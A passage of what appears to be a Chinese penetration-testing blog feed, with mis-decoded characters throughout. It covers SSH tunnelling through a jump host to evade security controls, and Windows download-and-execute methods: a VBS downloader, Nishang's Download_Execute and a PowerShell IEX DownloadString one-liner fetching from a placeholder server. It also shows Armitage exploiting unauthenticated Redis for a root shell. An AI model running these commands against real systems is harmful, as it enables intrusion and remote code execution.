root@192.168.1.11&lt;è·³æ¿æœº&gt;</span><br></pre></td></tr></table></figure><p><code>ç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3309</span><br></pre></td></tr></table></figure><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210723170858890.png" class><h4 id="02-è¿œç¨‹ç«¯å£è½¬å‘"><a href="#02-è¿œç¨‹ç«¯å£è½¬å‘" class="headerlink" title="02.è¿œç¨‹ç«¯å£è½¬å‘"></a>02.è¿œç¨‹ç«¯å£è½¬å‘</h4><blockquote><p>æµ‹è¯•ç¯å¢ƒï¼š</p><p>kaliä¸å¯ä»¥è®¿é—®å†…ç½‘æ‰€æœ‰æœºå™¨ï¼Œå†…ç½‘webæœåŠ¡å™¨(centos 7)å¯ä»¥è®¿é—®kaliï¼Œå†…ç½‘æ•°æ®åº“(win7)ä¸å¯ä»¥è®¿é—®kaliï¼Œå†…ç½‘å…¨é€šã€‚</p></blockquote><p><code>webä¸ºè·³æ¿æœºï¼Œå°†kaliçš„3319ç«¯å£çš„æµé‡è½¬å‘åˆ°ç›®æ ‡ä¸»æœºwin7çš„3389ç«¯å£ï¼Œè®¿é—®kaliçš„3319ç«¯å£å°±å¯ä»¥è®¿é—®win7çš„3389ç«¯å£</code></p><p><code>web(centos 7æ‰§è¡Œ)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 3319:10.10.10.20:3389 root@192.168.1.7</span><br><span class="line">ssh -CfNg -R 3319&lt;è¿œç¨‹ä¸»æœºkaliç«¯å£&gt;:10.10.10.20:3389&lt;ç›®æ ‡ä¸»æœºwin7æ•°æ®åº“&gt; root@192.168.1.7&lt;è¿œç¨‹ä¸»æœºkali&gt;</span><br></pre></td></tr></table></figure><p><code>ç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3309</span><br></pre></td></tr></table></figure><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210723172754616.png" class><blockquote><p>æœ¬åœ°ç«¯å£è½¬å‘ï¼š</p><p>åœ¨æœ¬åœ°(å®¢æˆ·æœº)ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œæ‰€æœ‰è®¿é—®è¿™ä¸ªç«¯å£çš„æ•°æ®éƒ½ä¼šé€šè¿‡sshéš§é“è½¬å‘åˆ°è¿œç«¯å¯¹åº”çš„ç«¯å£</p><p>è¿œç¨‹ç«¯å£è½¬å‘ï¼š</p><p>åœ¨è¿œç¨‹ä¸»æœºä¸Š(æœåŠ¡å™¨)ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œæ‰€æœ‰è®¿é—®è¿œç¨‹æœåŠ¡å™¨æŒ‡å®šç«¯å£çš„æ•°æ®éƒ½ä¼šé€šè¿‡sshéš§é“ä¼ è¾“åˆ°æœ¬åœ°å¯¹åº”çš„ç«¯å£</p></blockquote><h3 id="2-HTTP-HTTPSåè®®"><a href="#2-HTTP-HTTPSåè®®" class="headerlink" title="2.HTTP/HTTPSåè®®"></a>2.HTTP/HTTPSåè®®</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3Jn">reGeorgå·¥å…·<i class="fa fa-external-link-alt"></i></span></p><h3 id="3-DNSåè®®"><a href="#3-DNSåè®®" class="headerlink" title="3.DNSåè®®"></a>3.DNSåè®®</h3><p><code>æ­¤éƒ¨åˆ†å†…å®¹æµ‹è¯•éœ€è¦å…¬ç½‘åŸŸå</code></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lhZ294ODYvZG5zY2F0Mg==">dnscat2<i class="fa fa-external-link-alt"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsMWV4L2lvZGluZQ==">iodine<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x05-socksä»£ç†"><a href="#0x05-socksä»£ç†" class="headerlink" title="0x05.socksä»£ç†"></a>0x05.socksä»£ç†</h2><p>æ­¤éƒ¨åˆ†å†…å®¹æµ‹è¯•éœ€è¦å…¬ç½‘ipä¸å†…ç½‘ç¯å¢ƒ</p><h3 id="1-EarthWorm"><a href="#1-EarthWorm" class="headerlink" title="1.EarthWorm"></a>1.EarthWorm</h3><h3 id="2-ScoksCap64"><a href="#2-ScoksCap64" class="headerlink" title="2.ScoksCap64"></a>2.ScoksCap64</h3><h3 id="3-Proxychains"><a href="#3-Proxychains" class="headerlink" title="3.Proxychains"></a>3.Proxychains</h3><h2 id="0x06-å‹ç¼©æ•°æ®"><a href="#0x06-å‹ç¼©æ•°æ®" class="headerlink" title="0x06.å‹ç¼©æ•°æ®"></a>0x06.å‹ç¼©æ•°æ®</h2><p>æ¸—é€è¿‡ç¨‹ä¸­å¸¸å¸¸è¦ä¸‹è½½æ•°æ®ï¼Œè¿™é‡Œæœ‰å‡ ç§å°†æ•°æ®è¿›è¡Œå‹ç¼©æ–¹ä¾¿ä¸‹è½½çš„æŠ€æœ¯</p><h3 id="1-RAR"><a href="#1-RAR" class="headerlink" title="1.RAR"></a>1.RAR</h3><p><code>è¿™é‡Œæå–å‡ºwinrarä¸‹çš„rar.exeï¼Œå‚æ•°å¦‚ä¸‹ï¼š</code></p><table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>-a</td><td>æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</td></tr><tr><td>-k</td><td>é”å®šå‹ç¼©æ–‡ä»¶</td></tr><tr><td>-s</td><td>ç”Ÿæˆå­˜æ¡£æ–‡ä»¶ï¼ˆæé«˜å‹ç¼©æ¯”ï¼‰</td></tr><tr><td>-p</td><td>æŒ‡å®šå‹ç¼©å¯†ç </td></tr><tr><td>-r</td><td>é€’å½’å‹ç¼©ï¼ŒåŒ…æ‹¬å­ç›®å½•</td></tr><tr><td>-x</td><td>æŒ‡å®šè¦æ’é™¤çš„æ–‡ä»¶</td></tr><tr><td>-v</td><td>åˆ†å·æ‰“åŒ…ï¼Œå¤§æ–‡ä»¶ä½¿ç”¨</td></tr><tr><td>-ep</td><td>ä»åç§°ä¸­æ’é™¤è·¯å¾„</td></tr><tr><td>-ep1</td><td>ä»åç§°ä¸­æ’é™¤åŸºæœ¬ç›®å½•</td></tr><tr><td>-m0</td><td>å­˜å‚¨ï¼Œæ·»åŠ åˆ°å‹ç¼©æ–‡ä»¶æ—¶ä¸å‹ç¼©æ–‡ä»¶</td></tr><tr><td>-m1</td><td>æœ€å¿«</td></tr><tr><td>-m2</td><td>è¾ƒå¿«</td></tr><tr><td>-m3</td><td>æ ‡å‡†</td></tr><tr><td>-m4</td><td>è¾ƒå¥½</td></tr><tr><td>-m5</td><td>æœ€å¥½</td></tr></tbody></table><h3 id="2-7-zip"><a href="#2-7-zip" class="headerlink" title="2.7-zip"></a>2.7-zip</h3><blockquote><p>è¿™é‡Œæå–7z.exeï¼Œå‚æ•°å¦‚ä¸‹</p></blockquote><table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>-r</td><td>é€’å½’å‹ç¼©</td></tr><tr><td>-o</td><td>æŒ‡å®šè¾“å‡ºç›®å½•</td></tr><tr><td>-p</td><td>æŒ‡å®šå¯†ç </td></tr><tr><td>-v</td><td>åˆ†å·å‹ç¼©</td></tr><tr><td>a</td><td>æ·»åŠ å‹ç¼©æ–‡ä»¶</td></tr></tbody></table><h2 id="0x07-ä¸Šä¼ ä¸‹è½½"><a href="#0x07-ä¸Šä¼ ä¸‹è½½" class="headerlink" title="0x07.ä¸Šä¼ ä¸‹è½½"></a>0x07.ä¸Šä¼ ä¸‹è½½</h2><p>å¯¹äºä¸èƒ½ä¸Šä¼ shellï¼Œä½†æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„windowsæœåŠ¡å™¨ï¼Œå¯ä»¥è¿›è¡Œä¸Šä¼ å’Œä¸‹è½½æ“ä½œ</p><h3 id="1-ftpåè®®ä¸Šä¼ ä¸‹è½½"><a href="#1-ftpåè®®ä¸Šä¼ ä¸‹è½½" class="headerlink" title="1.ftpåè®®ä¸Šä¼ ä¸‹è½½"></a>1.ftpåè®®ä¸Šä¼ ä¸‹è½½</h3><p><code>å¸¸ç”¨å‘½ä»¤</code></p><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>open &lt;æœåŠ¡å™¨åœ°å€&gt;</td><td>é“¾æ¥æœåŠ¡å™¨</td></tr><tr><td>cd &lt;ç›®å½•å&gt;</td><td>è¿›å…¥æŒ‡å®šç›®å½•</td></tr><tr><td>lcd &lt;æ–‡ä»¶å¤¹è·¯å¾„&gt;</td><td>å®šä½æœ¬åœ°æ–‡ä»¶å¤¹ï¼ˆä¸Šä¼ æ–‡ä»¶çš„ä½ç½®æˆ–è€…ä¸‹è½½æ–‡ä»¶çš„æœ¬åœ°ä½ç½®ï¼‰</td></tr><tr><td>type</td><td>æŸ¥çœ‹å½“å‰çš„ä¼ è¾“æ–¹å¼</td></tr><tr><td>ascii</td><td>è®¾ç½®ä¼ è¾“æ–¹å¼ä¸ºasciiç ï¼ˆTXTæ–‡ä»¶ç­‰ï¼‰</td></tr><tr><td>binary</td><td>è®¾ç½®ä¼ è¾“æ–¹å¼ä¸ºäºŒè¿›åˆ¶ä¼ è¾“ï¼ˆEXEæ–‡ä»¶ï¼Œå›¾ç‰‡ï¼Œè§†é¢‘ï¼‰</td></tr><tr><td>close</td><td>ç»“æŸä¸ftpæœåŠ¡å™¨çš„ä¼šè¯</td></tr><tr><td>quit</td><td>ç»“æŸä¸ftpæœåŠ¡å™¨çš„ä¼šè¯å¹¶é€€å‡ºftpç¯å¢ƒ</td></tr><tr><td>put &lt;æ–‡ä»¶å&gt; [æ–°çš„æ–‡ä»¶å]</td><td>ä¸Šä¼ ï¼Œ[]å†…å®¹ä¸æŒ‡å®šåˆ™ä¸ä¿®æ”¹</td></tr><tr><td>send &lt;æ–‡ä»¶å&gt; [æ–°çš„æ–‡ä»¶å]</td><td>ä¸Šä¼ ï¼Œ[]å†…å®¹ä¸æŒ‡å®šåˆ™ä¸ä¿®æ”¹</td></tr><tr><td>get &lt;æ–‡ä»¶å&gt; [æ–°çš„æ–‡ä»¶å]</td><td>ä¸‹è½½ï¼Œ[]å†…å®¹ä¸æŒ‡å®šåˆ™ä¸ä¿®æ”¹</td></tr><tr><td>mget &lt;æ–‡ä»¶å&gt; [æ–‡ä»¶åâ€¦]</td><td>ä¸‹è½½å¤šä¸ªæ–‡ä»¶ï¼Œæ”¯æŒç©ºæ ¼å’Œ?é€šé…ç¬¦ï¼Œå¦‚ä¸‹è½½æ‰€æœ‰MP3æ–‡ä»¶ï¼šmget .mp3</td></tr></tbody></table><h3 id="2-vbsä¸Šä¼ "><a href="#2-vbsä¸Šä¼ " class="headerlink" title="2.vbsä¸Šä¼ "></a>2.vbsä¸Šä¼ </h3><blockquote><p>åˆ©ç”¨vbsä¸Šä¼ ä¸»è¦ä½¿ç”¨msxm12.xmlhttpå’Œadobd.streamå¯¹è±¡ï¼Œdownload.vbsæ–‡ä»¶ï¼š</p><p>ä½¿ç”¨echo å†…å®¹ &gt;&gt; download.vbsé€è¡Œå†™å…¥åæ‰§è¡Œ</p><p>Cscript download.vbs</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Set Post = CreateObject(&quot;Msxm12.XMLHTTP&quot;)</span><br><span class="line">Set Shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.Open &quot;GET&quot;,&quot;http://server_ip/target.exe&quot;,0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;C:\Test\target.exe&quot;,2</span><br></pre></td></tr></table></figure><h3 id="3-Nishangä¸Šä¼ "><a href="#3-Nishangä¸Šä¼ " class="headerlink" title="3.Nishangä¸Šä¼ "></a>3.Nishangä¸Šä¼ </h3><blockquote><p>Nishangå°†ä¸Šä¼ çš„EXEæ–‡ä»¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶çš„å½¢å¼ç„¶åç”¨echoè®¿é—®ç›®æ ‡æœåŠ¡å™¨æœ€åä½¿ç”¨Download_Executeè„šæœ¬ä¸‹è½½ã€‚<br>å…ˆåˆ©ç”¨Nishangä¸­çš„exetotext.ps1è„šæœ¬å°†Metasploitç”Ÿæˆçš„msf.exeä¿®æ”¹é—®msf.txtï¼š</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ ExetoText c\:msf.exe c:\msf.txt</span><br></pre></td></tr></table></figure><blockquote><p>æ¥ç€é€šè¿‡echoå°†hexå€¼æ·»åŠ åˆ°ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œè°ƒç”¨Download_Executeï¼š</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Download_Execute http://server_ip/target.txt</span><br></pre></td></tr></table></figure><h3 id="4-Debugä¸Šä¼ "><a href="#4-Debugä¸Šä¼ " class="headerlink" title="4.Debugä¸Šä¼ "></a>4.Debugä¸Šä¼ </h3><h3 id="5-bitsadminä¸‹è½½"><a href="#5-bitsadminä¸‹è½½" class="headerlink" title="5.bitsadminä¸‹è½½"></a>5.bitsadminä¸‹è½½</h3><blockquote><p>bitsadminä¸æ”¯æŒHTTPSå’ŒFTPï¼Œä¸”åœ¨Windows XP/Server 2003åŠä»¥å‰çš„ç‰ˆæœ¬æ— æ³•ä½¿ç”¨ï¼ŒWindows7/8/10è‡ªå¸¦ã€‚</p></blockquote><h3 id="6-PowerShellä¸‹è½½"><a href="#6-PowerShellä¸‹è½½" class="headerlink" title="6.PowerShellä¸‹è½½"></a>6.PowerShellä¸‹è½½</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX(New-Object System.Net.Webclient).DownloadString(&#x27;https://server_ip/target.exe&#x27;);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-åŸºç¡€çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#0x01-åŸºç¡€çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;0x01.åŸºç¡€çŸ¥è¯†&quot;&gt;&lt;/a&gt;0x01.åŸºç¡€çŸ¥è¯†&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;å®Œæˆå†…ç½‘ä¿¡æ¯æœé›†åï¼Œéœ€è¦å…ˆåˆ¤æ–­æµé‡æ˜¯å¦å‡ºå¾—å»ã€è¿›å¾—æ¥ã€‚éšè—é€šä¿¡éš§é“æŠ€æœ¯å¸¸ç”¨äºåœ¨è®¿é—®å—é™çš„ç½‘ç»œç¯å¢ƒä¸­è¿½è¸ªæ•°æ®æµå‘å’Œåœ¨éå—ä¿¡ä»»çš„ç½‘ç»œä¸­å®ç°å®‰å…¨çš„æ•°æ®ä¼ è¾“ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;1-æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#1-æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;1.æ¦‚è¿°&quot;&gt;&lt;/a&gt;1.æ¦‚è¿°&lt;/h3&gt;&lt;p&gt;â€‹        åœ¨æ¸—é€åœºæ™¯ä¸­ï¼Œå„ç§å®‰å…¨è®¾å¤‡ä¼šæ£€æŸ¥å¯¹å¤–è¿æ¥çš„æƒ…å†µï¼Œå¦‚æœå‘ç°å¼‚å¸¸ï¼Œå°±ä¼šå¯¹é€šä¿¡è¿›è¡Œé˜»æ–­ã€‚å› æ­¤å»ºç«‹ä¸“é—¨çš„éšè”½éš§é“å°±ååˆ†å¿…è¦ï¼Œè¿™èƒ½ç»•è¿‡ç«¯å£å±è”½ã€‚&lt;br&gt;å¸¸ç”¨çš„éš§é“å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ç½‘ç»œå±‚éš§é“ï¼šIPv6ã€ICMPã€GRE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ä¼ è¾“å±‚éš§é“ï¼šTCPã€UDPã€å¸¸è§„ç«¯å£è½¬å‘&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;åº”ç”¨å±‚éš§é“ï¼šSSHã€HTTPã€HTTPSã€DNS&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="å†…ç½‘æ¸—é€æµ‹è¯•" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="å†…ç½‘å®‰å…¨" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Armitage</title>
    <link href="https://lunamoore.github.io/2021/07/19/Armitage/"/>
    <id>https://lunamoore.github.io/2021/07/19/Armitage/</id>
    <published>2021-07-19T09:33:15.000Z</published>
    <updated>2021-07-19T09:49:21.195Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Armitage"><a href="#Armitage" class="headerlink" title="Armitage"></a>Armitage</h1><h2 id="0x01-ä»€ä¹ˆæ˜¯Armitage"><a href="#0x01-ä»€ä¹ˆæ˜¯Armitage" class="headerlink" title="0x01.ä»€ä¹ˆæ˜¯Armitage"></a>0x01.ä»€ä¹ˆæ˜¯Armitage</h2><blockquote><p>Armitage æ˜¯ä¸€ä¸ªç”¨äº<span class="exturl" data-url="aHR0cDovL3d3dy5tZXRhc3Bsb2l0LmNvbS8=">Metasploit<i class="fa fa-external-link-alt"></i></span>çš„<span class="exturl" data-url="aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCM4">å¯ç¼–å†™è„šæœ¬çš„<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCNtdWx0aQ==">çº¢é˜Ÿåä½œ<i class="fa fa-external-link-alt"></i></span>å·¥å…·ï¼Œå¯å°†ç›®æ ‡å¯è§†åŒ–ã€æ¨èæ¼æ´åˆ©ç”¨å¹¶å…¬å¼€æ¡†æ¶ä¸­çš„é«˜çº§åæ¼æ´åˆ©ç”¨åŠŸèƒ½ã€‚</p><p>é€šè¿‡ä¸€ä¸ª Metasploit å®ä¾‹ï¼Œæ‚¨çš„å›¢é˜Ÿå°†ï¼š</p><ul><li>ä½¿ç”¨ç›¸åŒçš„ä¼šè¯</li><li>å…±äº«ä¸»æœºã€æ•è·çš„æ•°æ®å’Œä¸‹è½½çš„æ–‡ä»¶</li><li>é€šè¿‡å…±äº«äº‹ä»¶æ—¥å¿—è¿›è¡Œé€šä¿¡ã€‚</li><li>è¿è¡Œæœºå™¨äººä»¥è‡ªåŠ¨æ‰§è¡Œçº¢é˜Ÿä»»åŠ¡ã€‚</li></ul><p>Armitage æ˜¯<span class="exturl" data-url="aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk">çº¢é˜Ÿè¡ŒåŠ¨<i class="fa fa-external-link-alt"></i></span>çš„<span class="exturl" data-url="aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk">åŠ›é‡å€å¢å™¨<i class="fa fa-external-link-alt"></i></span>ã€‚</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbS8=">Cobalt Strike<i class="fa fa-external-link-alt"></i></span>æ˜¯ç”¨äº<span class="exturl" data-url="aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA4LzAzL3JhcGhhZWxzLW1hZ2ljLXF1YWRyYW50Lw==">å¯¹æ‰‹æ¨¡æ‹Ÿ<i class="fa fa-external-link-alt"></i></span>å’Œ<span class="exturl" data-url="aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA3LzA5L21vZGVscy1mb3ItcmVkLXRlYW0tb3BlcmF0aW9ucy8=">çº¢é˜Ÿè¡ŒåŠ¨<i class="fa fa-external-link-alt"></i></span>çš„å·¥å…·é›†ã€‚æˆªè‡³ 2015 å¹´ 10 æœˆï¼ŒCobalt Strike ä¸ä¸ Armitage å…±äº«ä»£ç ï¼Œä¹Ÿä¸ä¾èµ–äº Metasploit æ¡†æ¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ Armitage é€šè¿‡ Metasploit æ¼æ´åˆ©ç”¨æ¥è§¦å‘ Cobalt Strike çš„ Beacon æœ‰æ•ˆè½½è·ã€‚æ‚¨è¿˜å¯ä»¥é€šè¿‡ Cobalt Strike Beacon éš§é“ä¼ è¾“ Metasploit æ”»å‡»ã€‚</p></blockquote><a id="more"></a><h2 id="0x02-å®‰è£…ä½¿ç”¨"><a href="#0x02-å®‰è£…ä½¿ç”¨" class="headerlink" title="0x02.å®‰è£…ä½¿ç”¨"></a>0x02.å®‰è£…ä½¿ç”¨</h2><p><code>é¦–å…ˆè¿›å…¥armitageç›®å½•</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/armitage]</span><br><span class="line">â””â”€# ./teamserver 192.168.1.7 pass</span><br><span class="line">[*] Generating X509 certificate and keystore (for SSL)</span><br><span class="line">[*] Starting RPC daemon</span><br><span class="line">[*] MSGRPC starting on 127.0.0.1:55554 (NO SSL):Msg...</span><br><span class="line">[*] MSGRPC backgrounding at 2021-07-19 05:02:00 -0400...</span><br><span class="line">[*] MSGRPC background PID 8183</span><br><span class="line">[*] sleeping for 20s (to let msfrpcd initialize)</span><br><span class="line">[*] Starting Armitage team server</span><br><span class="line">[*] Use the following connection details to connect your clients:</span><br><span class="line">        Host: 192.168.1.7</span><br><span class="line">        Port: 55553</span><br><span class="line">        User: msf</span><br><span class="line">        Pass: pass</span><br><span class="line"></span><br><span class="line">[*] Fingerprint (check for this string when you connect):</span><br><span class="line">        6ad0a753836d3ae33fc409bcc19c4523b1701210</span><br><span class="line">[+] hacking is such a lonely thing, until now</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>å®¢æˆ·ç«¯è¿æ¥å³å¯</code></p><img src="/2021/07/19/Armitage/image-20210719170502446.png" class><img src="/2021/07/19/Armitage/image-20210719170541740.png" class><h2 id="0x03-Redisæœªæˆæƒè®¿é—®åˆ©ç”¨"><a href="#0x03-Redisæœªæˆæƒè®¿é—®åˆ©ç”¨" class="headerlink" title="0x03.Redisæœªæˆæƒè®¿é—®åˆ©ç”¨"></a>0x03.Redisæœªæˆæƒè®¿é—®åˆ©ç”¨</h2><blockquote><p>ä¹‹å‰å¤ç°è¿‡Redisæœªæˆæƒè®¿é—®æ¼æ´ï¼Œæ‰‹å¤´ç¯å¢ƒè¿˜æ²¡é”€æ¯ã€‚ã€‚ã€‚</p></blockquote><h3 id="01-æœç´¢Redis"><a href="#01-æœç´¢Redis" class="headerlink" title="01.æœç´¢Redis"></a>01.æœç´¢Redis</h3><img src="/2021/07/19/Armitage/image-20210719170906841.png" class><h3 id="02-redis-replication-cmd-execåˆ©ç”¨"><a href="#02-redis-replication-cmd-execåˆ©ç”¨" class="headerlink" title="02.redis_replication_cmd_execåˆ©ç”¨"></a>02.redis_replication_cmd_execåˆ©ç”¨</h3><p><code>åŒå‡»å³å¯è¿›è¡Œé…ç½®</code></p><img src="/2021/07/19/Armitage/image-20210719171145861.png" class><h3 id="03-ç‚¹å‡»Launchå³å¯åˆ©ç”¨"><a href="#03-ç‚¹å‡»Launchå³å¯åˆ©ç”¨" class="headerlink" title="03.ç‚¹å‡»Launchå³å¯åˆ©ç”¨"></a>03.ç‚¹å‡»Launchå³å¯åˆ©ç”¨</h3><p><code>åˆ©ç”¨æˆåŠŸ</code></p><img src="/2021/07/19/Armitage/image-20210719171315981.png" class><h3 id="04-shellè·å–"><a href="#04-shellè·å–" class="headerlink" title="04.shellè·å–"></a>04.shellè·å–</h3><p><code>å³é”®</code></p><img src="/2021/07/19/Armitage/image-20210719171405205.png" class><p><code>è·å–root shell</code></p><img src="/2021/07/19/Armitage/image-20210719171509977.png" class>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Armitage&quot;&gt;&lt;a href=&quot;#Armitage&quot; class=&quot;headerlink&quot; title=&quot;Armitage&quot;&gt;&lt;/a&gt;Armitage&lt;/h1&gt;&lt;h2 id=&quot;0x01-ä»€ä¹ˆæ˜¯Armitage&quot;&gt;&lt;a href=&quot;#0x01-ä»€ä¹ˆæ˜¯Armitage&quot; class=&quot;headerlink&quot; title=&quot;0x01.ä»€ä¹ˆæ˜¯Armitage&quot;&gt;&lt;/a&gt;0x01.ä»€ä¹ˆæ˜¯Armitage&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Armitage æ˜¯ä¸€ä¸ªç”¨äº&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5tZXRhc3Bsb2l0LmNvbS8=&quot;&gt;Metasploit&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;çš„&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCM4&quot;&gt;å¯ç¼–å†™è„šæœ¬çš„&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt; &lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCNtdWx0aQ==&quot;&gt;çº¢é˜Ÿåä½œ&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;å·¥å…·ï¼Œå¯å°†ç›®æ ‡å¯è§†åŒ–ã€æ¨èæ¼æ´åˆ©ç”¨å¹¶å…¬å¼€æ¡†æ¶ä¸­çš„é«˜çº§åæ¼æ´åˆ©ç”¨åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡ä¸€ä¸ª Metasploit å®ä¾‹ï¼Œæ‚¨çš„å›¢é˜Ÿå°†ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨ç›¸åŒçš„ä¼šè¯&lt;/li&gt;
&lt;li&gt;å…±äº«ä¸»æœºã€æ•è·çš„æ•°æ®å’Œä¸‹è½½çš„æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;é€šè¿‡å…±äº«äº‹ä»¶æ—¥å¿—è¿›è¡Œé€šä¿¡ã€‚&lt;/li&gt;
&lt;li&gt;è¿è¡Œæœºå™¨äººä»¥è‡ªåŠ¨æ‰§è¡Œçº¢é˜Ÿä»»åŠ¡ã€‚&lt;/li&gt;
&lt;/ul&gt;
